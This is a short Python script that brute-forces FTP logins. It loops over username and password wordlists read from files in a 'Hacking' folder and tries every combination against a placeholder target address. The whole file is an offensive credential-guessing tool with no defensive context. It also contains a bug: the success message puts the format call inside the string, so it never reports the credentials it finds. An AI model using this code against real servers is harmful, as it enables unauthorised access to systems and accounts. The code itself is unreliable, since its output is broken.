import ftplib 

def attack(ip, user, password):
    ftp = ftplib.FTP (ip)
    try:
        ftp.login(user,password)
        ftp.quit()
        print('User: {}:{}.format(user, password)')
    except:
        print("Authentication failed")

ip = '0.0.0.0'
users = open('Hacking\\users.txt','r')
users = users.read().split('\n')
passwords = open('Hacking\\passwords.txt','r')
passwords = passwords.read().split('\n')

for u in users :
    for p in passwords:
        attack(ip,u,p)
